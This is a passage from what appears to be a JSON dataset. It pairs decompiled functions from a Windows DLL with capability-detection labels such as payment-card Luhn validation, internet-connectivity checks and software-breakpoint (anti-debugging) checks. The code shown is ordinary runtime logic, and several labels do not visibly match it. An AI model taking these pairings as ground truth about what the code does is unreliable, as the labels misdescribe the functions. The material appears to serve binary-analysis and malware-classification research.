        "decompiled_code": "\nulong * fcn.18000d138(ulong *arg1, ulong arg2)\n\n{\n    char cVar1;\n    double arg4;\n    int32_t iVar2;\n    ulong uVar3;\n    int64_t arg2_00;\n    float fStack40;\n    uint uStack36;\n    char cStack32;\n    \n    if (**0x1800914b8 == '\\0') {\n        *(arg1 + 1) = 0;\n        uVar3 = 0x180047780;\n    }\n    else {\n        if (**0x1800914b8 - 0x30U < 10) {\n            cVar1 = **0x1800914b8;\n            *0x1800914b8 = *0x1800914b8 + 1;\n            fcn.18000946c(arg1, cVar1 + -0x2f);\n            return arg1;\n        }\n        fcn.180010ab8(&fStack40);\n        if (cStack32 != '\\0') {\n            *0x1800914b8 = *0x1800914b8 + 1;\n            if (arg2 == 0x42) {\n                iVar2 = fcn.1800116c4(0, 0, 0x180047140, CONCAT44(uStack36, fStack40));\n                arg2_00 = iVar2 + 1;\n                uVar3 = fcn.18000d95c(0x1800914e0, arg2_00);\ncode_r0x00018000d1fa:\n                fcn.18001171c(uVar3, arg2_00, 0x180047140, CONCAT44(uStack36, fStack40));\n                fcn.180008e50(arg1, uVar3);\n                return arg1;\n            }\n            if (arg2 == 0x41) {\n                arg4 = fStack40;\n                fStack40 = SUB84(arg4, 0);\n                uStack36 = arg4 >> 0x20;\n                iVar2 = fcn.1800116c4(0, 0, 0x180047140, arg4);\n                arg2_00 = iVar2 + 1;\n                uVar3 = fcn.18000d95c(0x1800914e0, arg2_00);\n                goto code_r0x00018000d1fa;\n            }\n        }\n        uVar3 = 0x180047780;\n        if (**0x1800914b8 != '\\0') {\n            uVar3 = 0;\n        }\n        *(arg1 + 1) = -(**0x1800914b8 != '\\0') & 2;\n    }\n    *arg1 = uVar3;\n    return arg1;\n}\n",
        "token_count": 611
    },
    "18000fd5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_10h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18000fd5c(ulong *arg1)\n\n{\n    char *pcVar1;\n    uint32_t uVar2;\n    ulong uVar3;\n    code **ppcVar4;\n    code **ppcVar5;\n    code **arg2;\n    uchar *puVar6;\n    int64_t arg2_00;\n    uint32_t uVar7;\n    char **arg1_00;\n    uchar auStack136 [32];\n    char *pcStack104;\n    uint uStack96;\n    uint uStack92;\n    char *var_50h;\n    ulong var_48h;\n    ulong var_40h;\n    ulong var_38h;\n    char *var_30h;\n    ulong uStack48;\n    uint64_t var_bp_20h;\n    ulong var_bp_10h;\n    \n    var_bp_20h = *0x180090000 ^ auStack136;\n    arg2 = NULL;\n    uVar7 = **0x1800914b8;\n    pcVar1 = *0x1800914b8 + 1;\n    if (uVar7 < 0x47) {\n        if (uVar7 != 0x46) {\n            if (uVar7 < 0x37) {\n                if (uVar7 == 0x36) {\n                    *0x1800914b8 = pcVar1;\n                    fcn.18000d8c8(arg1);\n                    goto code_r0x000180010160;\n                }\n                if (**0x1800914b8 == '\\0') {\n                    *arg1 = 0x180047780;\n                    *(arg1 + 1) = 0;\n                    goto code_r0x000180010160;\n                }\n                if (uVar7 == 0x30) {\n                    *0x1800914b8 = pcVar1;\n                    fcn.18000f490(arg1);\n                    goto code_r0x000180010160;\n                }\n                if (uVar7 == 0x31) {\n                    if (*pcVar1 != '@') {\n                        _var_30h = ZEXT816(uStack48) << 0x40;\n                        _var_30h = ZEXT812(var_30h);\n                        *0x1800914b8 = pcVar1;\n                        fcn.18000ab3c(&var_30h);\n                        uVar3 = fcn.18000c6b0(&pcStack104);\n                        fcn.1800097fc(&var_30h, arg1, uVar3);\n                        goto code_r0x000180010160;\n                    }\n                    var_48h._0_4_ = 4;\n                    pcStack104 = \"NULL\";\n                    *0x1800914b8 = *0x1800914b8 + 2;\n                    goto code_r0x00018000fe2d;\n                }\n                if (uVar7 == 0x32) {\n                    *0x1800914b8 = pcVar1;\n                    fcn.180010b2c(arg1);\n                    goto code_r0x000180010160;\n                }\n                if (uVar7 == 0x34) {\n                    *0x1800914b8 = pcVar1;\n                    fcn.18000f7f8(arg1);\n                    goto code_r0x000180010160;\n                }\n                *0x1800914b8 = pcVar1;\n                if (uVar7 == 0x35) {\n                    fcn.18000abe8(arg1);\n                    goto code_r0x000180010160;\n                }\n            }\n            else {\n                if (uVar7 == 0x37) {\n                    *0x1800914b8 = pcVar1;\n                    fcn.180010968(arg1);\n                    goto code_r0x000180010160;\n                }\n                if (uVar7 == 0x38) {\n                    *0x1800914b8 = pcVar1;\n                    fcn.18000e4dc(arg1);\n                    goto code_r0x000180010160;\n                }\n                if ((uVar7 == 0x41) || (uVar7 == 0x42)) {\n                    *0x1800914b8 = pcVar1;\n                    fcn.18000d138(arg1, uVar7);\n                    goto code_r0x000180010160;\n                }\n                if (uVar7 == 0x43) {\n                    *0x1800914b8 = pcVar1;\n                    fcn.18000af78(arg1);\n                    goto code_r0x000180010160;\n                }\n                *0x1800914b8 = pcVar1;\n                if (uVar7 == 0x45) {\n                    fcn.18000c6b0(arg1);\n                    goto code_r0x000180010160;\n                }\n            }\n            goto code_r0x000180010155;\n        }\ncode_r0x00018000ff7c:\n        _var_30h = ZEXT816(uStack48) << 0x40;\n        _var_30h = ZEXT812(var_30h);\n        *0x1800914b8 = pcVar1;\n        fcn.18000ab3c(&var_30h);\n        if (((uVar7 == 0x48) || (uVar7 == 0x49)) || (uVar7 == 0x4a)) {\n            uVar3 = fcn.18000c6b0(&pcStack104);\n            fcn.180009944(&var_30h, uVar3);\n            if (uStack48 < '\\x02') {\n                if (var_30h == NULL) {\n                    _var_30h = _var_30h & 0xffffffffffffffff;\n                    _var_30h = ZEXT812(var_30h);\n                    fcn.18000ab3c(&var_30h);\n                }\n                else {\n                    ppcVar4 = fcn.18000d95c(0x1800914e0, 0x10);\n                    ppcVar5 = arg2;\n                    if (ppcVar4 != NULL) {\n                        *ppcVar4 = vtable.charNode.0;\n                        *(ppcVar4 + 1) = 0x2c;\n                        ppcVar5 = ppcVar4;\n                    }\n                    fcn.180008f24(&var_30h, ppcVar5);\n                }\n            }\n        }\n        if (uVar7 == 0x46) {\ncode_r0x000180010091:\n            uVar3 = fcn.18000f490(&pcStack104);\n            fcn.180009944(&var_30h, uVar3);\n            if (uStack48 < '\\x02') {\n                if (var_30h == NULL) {\n                    _var_30h = _var_30h & 0xffffffffffffffff;\n                    _var_30h = ZEXT812(var_30h);\n                    fcn.18000ab3c(&var_30h);\n                }\n                else {\n                    ppcVar5 = fcn.18000d95c(0x1800914e0, 0x10);\n                    if (ppcVar5 != NULL) {\n                        *ppcVar5 = vtable.charNode.0;\n                        *(ppcVar5 + 1) = 0x2c;\n                        arg2 = ppcVar5;\n                    }\n                    fcn.180008f24(&var_30h, arg2);\n                }\n            }\ncode_r0x0001800100f3:\n            uVar3 = fcn.18000f490(&pcStack104);\n            fcn.180009944(&var_30h, uVar3);\n        }\n        else {\n            if (uVar7 == 0x47) {\ncode_r0x00018001002f:\n                uVar3 = fcn.18000f490(&pcStack104);\n                fcn.180009944(&var_30h, uVar3);\n                if (uStack48 < '\\x02') {\n                    if (var_30h == NULL) {\n                        _var_30h = _var_30h & 0xffffffffffffffff;\n                        _var_30h = ZEXT812(var_30h);\n                        fcn.18000ab3c(&var_30h);\n                    }\n                    else {\n                        ppcVar4 = fcn.18000d95c(0x1800914e0, 0x10);\n                        ppcVar5 = arg2;\n                        if (ppcVar4 != NULL) {\n                            *ppcVar4 = vtable.charNode.0;\n                            *(ppcVar4 + 1) = 0x2c;\n                            ppcVar5 = ppcVar4;\n                        }\n                        fcn.180008f24(&var_30h, ppcVar5);\n                    }\n                }\n                goto code_r0x000180010091;\n            }\n            if (uVar7 == 0x48) goto code_r0x0001800100f3;\n            if (uVar7 == 0x49) goto code_r0x000180010091;\n            if (uVar7 == 0x4a) goto code_r0x00018001002f;\n        }\n        arg1_00 = &var_30h;\ncode_r0x00018001010f:\n        fcn.180009828(arg1_00, arg1);\n        goto code_r0x000180010160;\n    }\n    if (uVar7 < 0x51) {\n        if (uVar7 == 0x50) {\n            *0x1800914b8 = pcVar1;\n            fcn.18000c998(&pcStack104);\n            pcStack104 = \"lambda\";\n            var_48h._0_4_ = 6;\ncode_r0x00018000fe2d:\n            uStack96 = var_48h;\n            uStack92 = var_48h._4_4_;\n            var_50h = pcStack104;\n            fcn.1800092a8(arg1, &pcStack104);\n            goto code_r0x000180010160;\n        }\n        if ((((uVar7 == 0x47) || (uVar7 == 0x48)) || (uVar7 == 0x49)) || (uVar7 == 0x4a)) goto code_r0x00018000ff7c;\n        if (uVar7 == 0x4d) {\n            *0x1800914b8 = pcVar1;\n            fcn.1800102ac(&pcStack104);\n            if (uStack96 < '\\x02') {\n                fcn.18000fd5c(arg1);\n                goto code_r0x000180010160;\n            }\n        }\n        else {\n            *0x1800914b8 = pcVar1;\n            if (uVar7 == 0x4e) {\n                pcStack104 = \"nullptr\";\n                var_48h._0_4_ = 7;\n                goto code_r0x00018000fe2d;\n            }\n        }\ncode_r0x000180010155:\n        *(arg1 + 1) = 0;\n        *(arg1 + 1) = 2;\n    }\n    else {\n        *0x1800914b8 = pcVar1;\n        if (uVar7 == 0x51) goto code_r0x000180010155;\n        if (uVar7 == 0x52) {\ncode_r0x00018001018f:\n            fcn.18000f490(&pcStack104);\n            _var_30h = ZEXT816(0);\n            if (pcStack104 != NULL) {\n                puVar6 = (**0x180045380)(pcStack104, &var_30h, &uStack48 + 7);\n                *puVar6 = 0;\n            }\n            uVar2 = fcn.180014560(&var_30h);\n            if ((((*0x1800914c8 & 0x4000) != 0) && (*0x1800914d0 != 0)) &&\n               (arg2_00 = (**0x180045380)(uVar2 & 0xfff),  arg2_00 != 0)) {\n                fcn.180008e50(arg1, arg2_00);\n                goto code_r0x000180010160;\n            }\n            fcn.18001171c(&var_30h, 0x10, 0x180047158, uVar2 & 0xfff);\n            fcn.180008e50(&var_50h, &var_30h);\n            if ((uVar7 == 0x52) || (uVar7 == 0x54)) {\n                pcStack104 = \"`template-type-parameter-\";\ncode_r0x00018001029a:\n                uStack96 = 0x19;\n            }\n            else {\n                if (uVar7 == 0x55) {\n                    pcStack104 = \"`generic-class-parameter-\";\n                    goto code_r0x00018001029a;\n                }\n                if (uVar7 != 0x56) goto code_r0x000180010155;\n                pcStack104 = \"`generic-method-parameter-\";\n                uStack96 = 0x1a;\n            }\n            uVar3 = fcn.1800092a8(&var_40h, &pcStack104);\n            fcn.1800097fc(uVar3, &pcStack104, &var_50h);\n            arg1_00 = &pcStack104;\n            goto code_r0x00018001010f;\n        }\n        if (uVar7 != 0x53) {\n            if (((uVar7 != 0x54) && (uVar7 != 0x55)) && (uVar7 != 0x56)) goto code_r0x000180010155;\n            goto code_r0x00018001018f;\n        }\n        *(arg1 + 1) = 0;\n    }\n    *arg1 = 0;\ncode_r0x000180010160:\n    fcn.1800024e0(var_bp_20h ^ auStack136);\n    return;\n}\n",
        "token_count": 3153
    },
    "1800044b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1800044b4(int64_t arg1, int64_t arg2)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint8_t *puVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint64_t uVar8;\n    \n    puVar5 = *(arg1 + 0x10);\n    *(arg1 + 8) = puVar5;\n    uVar1 = *((*puVar5 & 0xf) + 0x180046160);\n    puVar5 = puVar5 + -*((*puVar5 & 0xf) + 0x180046150);\n    uVar2 = *(puVar5 + -4);\n    *(arg1 + 8) = puVar5;\n    *(arg1 + 0x18) = uVar2 >> (uVar1 & 0x1f);\n    uVar1 = *((*puVar5 & 0xf) + 0x180046160);\n    puVar5 = puVar5 + -*((*puVar5 & 0xf) + 0x180046150);\n    uVar2 = *(puVar5 + -4);\n    *(arg1 + 8) = puVar5;\n    *(arg1 + 0x1c) = uVar2 >> (uVar1 & 0x1f);\n    uVar1 = *((*puVar5 & 0xf) + 0x180046160);\n    puVar6 = puVar5 + -*((*puVar5 & 0xf) + 0x180046150);\n    uVar2 = puVar6[-1];\n    *(arg1 + 8) = puVar6;\n    *(arg1 + 0x20) = uVar2 >> (uVar1 & 0x1f);\n    uVar3 = *puVar6;\n    puVar6 = puVar6 + 1;\n    iVar4 = *(arg2 + 8);\n    *(arg1 + 8) = puVar6;\n    *(arg1 + 0x24) = uVar3;\n    if (iVar4 != 0) {\n        uVar8 = *(arg2 + 8);\n        do {\n            uVar1 = *((*puVar6 & 0xf) + 0x180046160);\n            puVar5 = puVar6 - *((*puVar6 & 0xf) + 0x180046150);\n            uVar2 = *(puVar5 + -4);\n            *(arg1 + 8) = puVar5;\n            *(arg1 + 0x18) = uVar2 >> (uVar1 & 0x1f);\n            uVar1 = *((*puVar5 & 0xf) + 0x180046160);\n            puVar5 = puVar5 + -*((*puVar5 & 0xf) + 0x180046150);\n            uVar2 = *(puVar5 + -4);\n            *(arg1 + 8) = puVar5;\n            *(arg1 + 0x1c) = uVar2 >> (uVar1 & 0x1f);\n            uVar1 = *((*puVar5 & 0xf) + 0x180046160);\n            puVar7 = puVar5 + -*((*puVar5 & 0xf) + 0x180046150);\n            uVar2 = puVar7[-1];\n            puVar6 = puVar7 + 1;\n            *(arg1 + 8) = puVar7;\n            *(arg1 + 0x20) = uVar2 >> (uVar1 & 0x1f);\n            uVar3 = *puVar7;\n            *(arg1 + 8) = puVar6;\n            *(arg1 + 0x24) = uVar3;\n            uVar1 = *((*puVar6 & 0xf) + 0x180046160);\n            puVar5 = puVar6 - *((*puVar6 & 0xf) + 0x180046150);\n            uVar2 = *(puVar5 + -4);\n            *(arg1 + 8) = puVar5;\n            *(arg1 + 0x18) = uVar2 >> (uVar1 & 0x1f);\n            uVar1 = *((*puVar5 & 0xf) + 0x180046160);\n            puVar5 = puVar5 + -*((*puVar5 & 0xf) + 0x180046150);\n            uVar2 = *(puVar5 + -4);\n            *(arg1 + 8) = puVar5;\n            *(arg1 + 0x1c) = uVar2 >> (uVar1 & 0x1f);\n            uVar1 = *((*puVar5 & 0xf) + 0x180046160);\n            puVar7 = puVar5 + -*((*puVar5 & 0xf) + 0x180046150);\n            uVar2 = puVar7[-1];\n            puVar6 = puVar7 + 1;\n            *(arg1 + 8) = puVar7;\n            *(arg1 + 0x20) = uVar2 >> (uVar1 & 0x1f);\n            uVar3 = *puVar7;\n            *(arg1 + 8) = puVar6;\n            *(arg1 + 0x24) = uVar3;\n            uVar8 = uVar8 - 1;\n        } while (uVar8 != 0);\n    }\n    return;\n}\n",
        "token_count": 1241
    },
    "180004be": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nulong fcn.180004be0(int64_t arg1, int32_t **arg2)\n\n{\n    char cVar1;\n    char cVar2;\n    int32_t *piVar3;\n    int64_t iVar4;\n    code *pcVar5;\n    char *pcVar6;\n    ulong uVar7;\n    int32_t iVar8;\n    int32_t *piVar9;\n    \n    if ((((arg2 == NULL) || (piVar3 = *arg2,  piVar3 == NULL)) || (*piVar3 != -0x1f928c9d)) ||\n       ((piVar3[6] != 4 || (2 < piVar3[8] + 0xe66cfae0U)))) {\n        fcn.180016c34();\n        pcVar5 = swi(3);\n        uVar7 = (*pcVar5)();\n        return uVar7;\n    }\n    iVar4 = *(piVar3 + 0xe);\n    piVar9 = iVar4 + 4 + *(*(piVar3 + 0xc) + 0xc);\n    iVar8 = *(*(*(piVar3 + 0xc) + 0xc) + iVar4);\n    if (0 < iVar8) {\n        do {\n            pcVar6 = arg1 + 0x10;\n            do {\n                cVar1 = *pcVar6;\n                cVar2 = pcVar6[(*(*piVar9 + 4 + iVar4) + 0x10 + iVar4) - (arg1 + 0x10)];\n                if (cVar1 != cVar2) break;\n                pcVar6 = pcVar6 + 1;\n            } while (cVar2 != '\\0');\n            if (cVar1 == cVar2) {\n                return 1;\n            }\n            iVar8 = iVar8 + -1;\n            piVar9 = piVar9 + 1;\n        } while (0 < iVar8);\n    }\n    return 0;\n}\n",
        "token_count": 434
    },
    "180004d2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.180004d28(int32_t *arg1, ulong arg2, ulong arg3, int64_t *arg4)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    int32_t *piStack56;\n    ulong uStack48;\n    \n    fcn.180008d24(arg3);\n    iVar2 = arg4[1];\n    puVar3 = arg4[7];\n    uVar10 = *arg4 - iVar2;\n    uVar7 = *(arg4 + 9);\n    piStack56 = arg1;\n    uStack48 = arg3;\n    if ((*(arg1 + 1) & 0x66) == 0) {\n        for (; uVar7 < *puVar3; uVar7 = uVar7 + 1) {\n            uVar6 = uVar7;\n            if (((puVar3[uVar6 * 4 + 1] <= uVar10) && (uVar10 < puVar3[uVar6 * 4 + 2])) && (puVar3[uVar6 * 4 + 4] != 0))\n            {\n                if (puVar3[uVar6 * 4 + 3] != 1) {\n                    iVar4 = (*(puVar3[uVar6 * 4 + 3] + iVar2))(&piStack56, arg2);\n                    if (iVar4 < 0) {\n                        return 0;\n                    }\n                    if (iVar4 < 1) goto code_r0x000180004e42;\n                }\n                if (((*arg1 == -0x1f928c9d) && (*0x1800462a8 != NULL)) &&\n                   (iVar4 = fcn.180040da0(0x1800462a8),  iVar4 != 0)) {\n                    (**0x1800462a8)(arg1, 1);\n                }\n                fcn.180008cf0(puVar3[uVar6 * 4 + 4] + iVar2, arg2, 1);\n                (*_sym.imp.KERNEL32.dll_RtlUnwindEx)(arg2, puVar3[uVar6 * 4 + 4] + iVar2, arg1, *arg1, arg4[5], arg4[8])\n                ;\n                fcn.180008d20();\n            }\ncode_r0x000180004e42:\n        }\n    }\n    else {\n        uVar6 = arg4[4] - iVar2;\n        for (; uVar1 = *puVar3,  uVar7 < uVar1; uVar7 = uVar7 + 1) {\n            uVar5 = uVar7;\n            if ((puVar3[uVar5 * 4 + 1] <= uVar10) && (uVar10 < puVar3[uVar5 * 4 + 2])) {\n                if ((arg1[1] & 0x20U) != 0) {\n                    uVar9 = 0;\n                    if (uVar1 != 0) {\n                        do {\n                            if ((((puVar3[uVar9 * 4 + 1] <= uVar6) && (uVar6 < puVar3[uVar9 * 4 + 2])) &&\n                                (puVar3[uVar9 * 4 + 4] == puVar3[uVar5 * 4 + 4])) &&\n                               (puVar3[uVar9 * 4 + 3] == puVar3[uVar5 * 4 + 3])) break;\n                            uVar8 = uVar9 + 1;\n                            uVar9 = uVar8;\n                        } while (uVar8 < uVar1);\n                    }\n                    if (uVar9 != uVar1) {\n                        return 1;\n                    }\n                }\n                if (puVar3[uVar5 * 4 + 4] == 0) {\n                    *(arg4 + 9) = uVar7 + 1;\n                    (*(puVar3[uVar5 * 4 + 3] + iVar2))();\n                }\n                else if ((uVar6 == puVar3[uVar5 * 4 + 4]) && ((arg1[1] & 0x20U) != 0)) {\n                    return 1;\n                }\n            }\n        }\n    }\n    return 1;\n}\n",
        "token_count": 1008
    },
    "1800051b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuchar (*) [32] fcn.1800051b0(uchar (*arg1) [32], ulong noname_1, uint64_t arg3)\n\n{\n    uchar auVar1 [32];\n    uchar (*pauVar2) [32];\n    uchar (*pauVar3) [32];\n    uchar (*pauVar4) [16];\n    uint64_t uVar5;\n    uint64_t uVar6;\n    uchar uVar7;\n    int64_t iVar10;\n    uchar auVar11 [16];\n    uchar in_YMM0 [32];\n    uchar auVar12 [32];\n    ushort uVar8;\n    uint uVar9;\n    \n    uVar5 = noname_1;\n    iVar10 = uVar5 * 0x101010101010101;\n    if (arg3 < 0x10) {\n        uVar7 = iVar10;\n        uVar8 = iVar10;\n        uVar9 = iVar10;\n    // switch table (16 cases) at 0x180097000\n        switch(*(arg3 * 4 + 0x180097000) + 0x180000000) {\n        case 0x1800051f1:\n            *(arg1[-1] + arg3 + 0x11) = iVar10;\n        case 0x1800051f5:\n            *(arg1[-1] + arg3 + 0x19) = uVar9;\n        case 0x1800051f9:\n            *(arg1[-1] + arg3 + 0x1d) = uVar8;\n        case 0x1800051fe:\n            arg1[-1][arg3 + 0x1f] = uVar7;\n            return arg1;\n        case 0x180005202:\n            return arg1;\n        case 0x180005203:\n            *(arg1[-1] + arg3 + 0x12) = iVar10;\n        case 0x180005207:\n            *(arg1[-1] + arg3 + 0x1a) = uVar9;\n        case 0x18000520b:\n            *(arg1[-1] + arg3 + 0x1e) = uVar8;\n            return arg1;\n        case 0x180005220:\n            *(arg1[-1] + arg3 + 0x13) = iVar10;\n        case 0x180005224:\n            *(arg1[-1] + arg3 + 0x1b) = uVar9;\n            arg1[-1][arg3 + 0x1f] = uVar7;\n            return arg1;\n        case 0x180005230:\n            *(arg1[-1] + arg3 + 0x14) = iVar10;\n        case 0x180005234:\n            *(arg1[-1] + arg3 + 0x1c) = uVar9;\n            return arg1;\n        case 0x180005239:\n            *(arg1[-1] + arg3 + 0x15) = iVar10;\n            *(arg1[-1] + arg3 + 0x1d) = uVar8;\n            arg1[-1][arg3 + 0x1f] = uVar7;\n            return arg1;\n        case 0x180005247:\n            *(arg1[-1] + arg3 + 0x17) = iVar10;\n            arg1[-1][arg3 + 0x1f] = uVar7;\n            return arg1;\n        case 0x180005250:\n            *(arg1[-1] + arg3 + 0x16) = iVar10;\n            *(arg1[-1] + arg3 + 0x1e) = uVar8;\n            return arg1;\n        case 0x18000525a:\n            *(arg1[-1] + arg3 + 0x18) = iVar10;\n            return arg1;\n        }\n    }\n    auVar11 = CONCAT88(iVar10, iVar10);\n    if (arg3 < 0x21) {\n        **arg1 = auVar11;\n        *(arg1[-1] + arg3 + 0x10) = auVar11;\n        return arg1;\n    }\n    pauVar2 = arg1;\n    if (*0x180090018 < 3) {\n        if ((arg3 <= *0x180090020) || ((*0x18009140c & 2) == 0)) {\n            iVar10 = (arg1 & 0xf) - 0x10;\n            pauVar4 = arg1 - iVar10;\n            arg3 = arg3 + iVar10;\n            if (0x80 < arg3) {\n                do {\n                    *pauVar4 = auVar11;\n                    pauVar4[1] = auVar11;\n                    pauVar4[2] = auVar11;\n                    pauVar4[3] = auVar11;\n                    pauVar4[4] = auVar11;\n                    pauVar4[5] = auVar11;\n                    pauVar4[6] = auVar11;\n                    pauVar4[7] = auVar11;\n                    pauVar4 = pauVar4[8];\n                    arg3 = arg3 - 0x80;\n                } while (0x7f < arg3);\n            }\n    // WARNING: Could not recover jumptable at 0x0001800054f8. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (9 cases) at 0x180097088\n            pauVar2 = (*(*((arg3 + 0xf >> 4) * 4 + 0x180097088) + 0x180000000))(pauVar4, uVar5 - iVar10);\n            return pauVar2;\n        }\n    }\n    else if (((arg3 <= *0x180090020) || (*0x180090028 < arg3)) || ((*0x18009140c & 2) == 0)) {\n        auVar12 = vinsertf128_avx(CONCAT1616(SUB3216(in_YMM0 >> 0x80, 0), auVar11), auVar11, 1);\n        iVar10 = (arg1 & 0x1f) - 0x20;\n        pauVar2 = arg1 - iVar10;\n        arg3 = arg3 + iVar10;\n        if (0x100 < arg3) {\n            if (*0x180090028 < arg3) {\n                do {\n                    uVar5 = arg3;\n                    pauVar3 = pauVar2;\n                    auVar1 = vmovntdq_avx(auVar12);\n                    *pauVar3 = auVar1;\n                    auVar1 = vmovntdq_avx(auVar12);\n                    pauVar3[1] = auVar1;\n                    auVar1 = vmovntdq_avx(auVar12);\n                    pauVar3[2] = auVar1;\n                    auVar1 = vmovntdq_avx(auVar12);\n                    pauVar3[3] = auVar1;\n                    auVar1 = vmovntdq_avx(auVar12);\n                    pauVar3[4] = auVar1;\n                    auVar1 = vmovntdq_avx(auVar12);\n                    pauVar3[5] = auVar1;\n                    auVar1 = vmovntdq_avx(auVar12);\n                    pauVar3[6] = auVar1;\n                    auVar1 = vmovntdq_avx(auVar12);\n                    pauVar3[7] = auVar1;\n                    pauVar2 = pauVar3[8];\n                    arg3 = uVar5 - 0x100;\n                } while (0xff < uVar5 - 0x100);\n                uVar6 = uVar5 - 0xe1 & 0xffffffffffffffe0;\n    // switch table (18 cases) at 0x180097064\n                switch(uVar5) {\n                case 0x1e1:\n                case 0x1e2:\n                case 0x1e3:\n                case 0x1e4:\n                case 0x1e5:\n                case 0x1e6:\n                case 0x1e7:\n                case 0x1e8:\n                case 0x1e9:\n                case 0x1ea:\n                case 0x1eb:\n                case 0x1ec:\n                case 0x1ed:\n                case 0x1ee:\n                case 0x1ef:\n                case 0x1f0:\n                case 0x1f1:\n                case 0x1f2:\n                case 499:\n                case 500:\n                case 0x1f5:\n                case 0x1f6:\n                case 0x1f7:\n                case 0x1f8:\n                case 0x1f9:\n                case 0x1fa:\n                case 0x1fb:\n                case 0x1fc:\n                case 0x1fd:\n                case 0x1fe:\n                case 0x1ff:\n                    auVar1 = vmovntdq_avx(auVar12);\n                    *(*pauVar3 + uVar6) = auVar1;\n                case 0x1c1:\n                case 0x1c2:\n                case 0x1c3:\n                case 0x1c4:\n                case 0x1c5:\n                case 0x1c6:\n                case 0x1c7:\n                case 0x1c8:\n                case 0x1c9:\n                case 0x1ca:\n                case 0x1cb:\n                case 0x1cc:\n                case 0x1cd:\n                case 0x1ce:\n                case 0x1cf:\n                case 0x1d0:\n                case 0x1d1:\n                case 0x1d2:\n                case 0x1d3:\n                case 0x1d4:\n                case 0x1d5:\n                case 0x1d6:\n                case 0x1d7:\n                case 0x1d8:\n                case 0x1d9:\n                case 0x1da:\n                case 0x1db:\n                case 0x1dc:\n                case 0x1dd:\n                case 0x1de:\n                case 0x1df:\n                case 0x1e0:\n                    auVar1 = vmovntdq_avx(auVar12);\n                    *(pauVar3[1] + uVar6) = auVar1;\n                case 0x1a1:\n                case 0x1a2:\n                case 0x1a3:\n                case 0x1a4:\n                case 0x1a5:\n                case 0x1a6:\n                case 0x1a7:\n                case 0x1a8:\n                case 0x1a9:\n                case 0x1aa:\n                case 0x1ab:\n                case 0x1ac:\n                case 0x1ad:\n                case 0x1ae:\n                case 0x1af:\n                case 0x1b0:\n                case 0x1b1:\n                case 0x1b2:\n                case 0x1b3:\n                case 0x1b4:\n                case 0x1b5:\n                case 0x1b6:\n                case 0x1b7:\n                case 0x1b8:\n                case 0x1b9:\n                case 0x1ba:\n                case 0x1bb:\n                case 0x1bc:\n                case 0x1bd:\n                case 0x1be:\n                case 0x1bf:\n                case 0x1c0:\n                    auVar1 = vmovntdq_avx(auVar12);\n                    *(pauVar3[2] + uVar6) = auVar1;\n                case 0x181:\n                case 0x182:\n                case 0x183:\n                case 0x184:\n                case 0x185:\n                case 0x186:\n                case 0x187:\n                case 0x188:\n                case 0x189:\n                case 0x18a:\n                case 0x18b:\n                case 0x18c:\n                case 0x18d:\n                case 0x18e:\n                case 399:\n                case 400:\n                case 0x191:\n                case 0x192:\n                case 0x193:\n                case 0x194:\n                case 0x195:\n                case 0x196:\n                case 0x197:\n                case 0x198:\n                case 0x199:\n                case 0x19a:\n                case 0x19b:\n                case 0x19c:\n                case 0x19d:\n                case 0x19e:\n                case 0x19f:\n                case 0x1a0:\n                    auVar1 = vmovntdq_avx(auVar12);\n                    *(pauVar3[3] + uVar6) = auVar1;\n                case 0x161:\n                case 0x162:\n                case 0x163:\n                case 0x164:\n                case 0x165:\n                case 0x166:\n                case 0x167:\n                case 0x168:\n                case 0x169:\n                case 0x16a:\n                case 0x16b:\n                case 0x16c:\n                case 0x16d:\n                case 0x16e:\n                case 0x16f:\n                case 0x170:\n                case 0x171:\n                case 0x172:\n                case 0x173:\n                case 0x174:\n                case 0x175:\n                case 0x176:\n                case 0x177:\n                case 0x178:\n                case 0x179:\n                case 0x17a:\n                case 0x17b:\n                case 0x17c:\n                case 0x17d:\n                case 0x17e:\n                case 0x17f:\n                case 0x180:\n                    auVar1 = vmovntdq_avx(auVar12);\n                    *(pauVar3[4] + uVar6) = auVar1;\n                case 0x141:\n                case 0x142:\n                case 0x143:\n                case 0x144:\n                case 0x145:\n                case 0x146:\n                case 0x147:\n                case 0x148:\n                case 0x149:\n                case 0x14a:\n                case 0x14b:\n                case 0x14c:\n                case 0x14d:\n                case 0x14e:\n                case 0x14f:\n                case 0x150:\n                case 0x151:\n                case 0x152:\n                case 0x153:\n                case 0x154:\n                case 0x155:\n                case 0x156:\n                case 0x157:\n                case 0x158:\n                case 0x159:\n                case 0x15a:\n                case 0x15b:\n                case 0x15c:\n                case 0x15d:\n                case 0x15e:\n                case 0x15f:\n                case 0x160:\n                    auVar1 = vmovntdq_avx(auVar12);\n                    *(pauVar3[5] + uVar6) = auVar1;\n                case 0x121:\n                case 0x122:\n                case 0x123:\n                case 0x124:\n                case 